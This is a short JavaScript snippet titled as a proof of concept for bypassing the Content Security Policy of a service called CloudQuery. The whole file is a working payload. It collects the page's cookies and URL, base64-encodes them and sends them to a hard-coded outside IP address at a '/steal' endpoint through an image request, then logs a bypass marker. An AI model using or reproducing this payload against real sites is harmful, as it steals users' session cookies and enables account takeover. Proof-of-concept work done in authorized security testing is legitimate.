// CloudQuery CSP Bypass PoC
(function() {
  var d = {cookies: document.cookie, url: window.location.href, ts: new Date().toISOString()};
  new Image().src = 'http://3.108.6.174:8920/steal?d=' + btoa(JSON.stringify(d));
  console.log('[CSP BYPASS]', window.location.origin);
})();
